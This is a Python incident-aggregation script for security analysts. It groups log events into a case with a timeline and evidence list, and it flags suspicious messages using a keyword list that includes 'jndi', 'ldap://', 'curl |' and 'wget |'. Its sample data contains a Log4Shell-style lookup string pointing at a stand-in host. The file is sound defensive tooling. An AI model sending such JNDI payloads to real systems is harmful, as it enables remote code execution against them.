#!/usr/bin/env python3
"""
Case Builder - deterministic incident aggregation from events.
No ML, just heuristics to group and prioritize.
"""

import json
import sys
from pathlib import Path
from typing import List, Dict, Set
from collections import defaultdict
from dataclasses import dataclass, field, asdict

sys.path.insert(0, str(Path(__file__).parent.parent))
from ingest.bots_loader import CanonicalEvent


@dataclass
class CaseState:
    """Aggregated case state from events."""
    case_id: str
    hosts: Set[str] = field(default_factory=set)
    users: Set[str] = field(default_factory=set)
    src_ips: Set[str] = field(default_factory=set)
    dst_ips: Set[str] = field(default_factory=set)
    timeline: List[Dict] = field(default_factory=list)
    evidence: List[Dict] = field(default_factory=list)
    severity_counts: Dict[str, int] = field(default_factory=lambda: defaultdict(int))
    event_type_counts: Dict[str, int] = field(default_factory=lambda: defaultdict(int))

    def to_dict(self) -> dict:
        return {
            "case_id": self.case_id,
            "hosts": list(self.hosts),
            "users": list(self.users),
            "src_ips": list(self.src_ips),
            "dst_ips": list(self.dst_ips),
            "timeline": self.timeline,
            "evidence": self.evidence,
            "severity_counts": dict(self.severity_counts),
            "event_type_counts": dict(self.event_type_counts),
        }


def is_high_value_event(event: CanonicalEvent) -> bool:
    """Determine if event is high-value for case building."""
    if event.severity in ["high", "critical"]:
        return True
    if event.event_type in ["alert", "auth"]:
        return True
    # Check for suspicious patterns in message
    suspicious = ["jndi", "ldap://", "rmi://", "exploit", "shell", "reverse", 
                  "curl |", "wget |", "base64", "powershell", "cmd.exe"]
    msg_lower = event.message.lower()
    if any(s in msg_lower for s in suspicious):
        return True
    return False


def build_case_from_events(events: List[CanonicalEvent], case_id: str = "CASE-001") -> CaseState:
    """Build case state from list of events. Deterministic."""
    case = CaseState(case_id=case_id)
    evidence_id = 0
    
    for event in events:
        # Collect entities
        if event.host:
            case.hosts.add(event.host)
        if event.user:
            case.users.add(event.user)
        if event.src_ip:
            case.src_ips.add(event.src_ip)
        if event.dst_ip:
            case.dst_ips.add(event.dst_ip)
        
        # Count types
        case.event_type_counts[event.event_type] += 1
        if event.severity:
            case.severity_counts[event.severity] += 1
        
        # High-value events become evidence + timeline
        if is_high_value_event(event):
            evidence_id += 1
            eid = f"E{evidence_id:04d}"
            
            case.timeline.append({
                "ts": event.ts,
                "event": event.message[:200],
                "evidence_id": eid
            })
            
            case.evidence.append({
                "id": eid,
                "excerpt": event.message[:500],
                "reason": f"{event.event_type}/{event.severity or 'unknown'}",
                "host": event.host,
                "src_ip": event.src_ip
            })
    
    # Sort timeline
    case.timeline.sort(key=lambda x: x["ts"])
    
    return case


def build_case_from_windows(windows: List[List[CanonicalEvent]], case_id: str = "CASE-001") -> CaseState:
    """Build case from multiple event windows."""
    all_events = []
    for window in windows:
        all_events.extend(window)
    return build_case_from_events(all_events, case_id)


if __name__ == "__main__":
    # Test with sample events
    sample = [
        CanonicalEvent(ts="2024-01-15T10:01:00Z", source="test", event_type="web",
                       message="GET /api?q=${jndi:ldap://evil/a}", src_ip="1.2.3.4", severity="high"),
        CanonicalEvent(ts="2024-01-15T10:01:01Z", source="test", event_type="dns",
                       message="DNS query evil.com", host="srv01"),
        CanonicalEvent(ts="2024-01-15T10:01:02Z", source="test", event_type="alert",
                       message="IDS alert: possible exploitation", severity="critical"),
    ]
    
    case = build_case_from_events(sample)
    print(json.dumps(case.to_dict(), indent=2))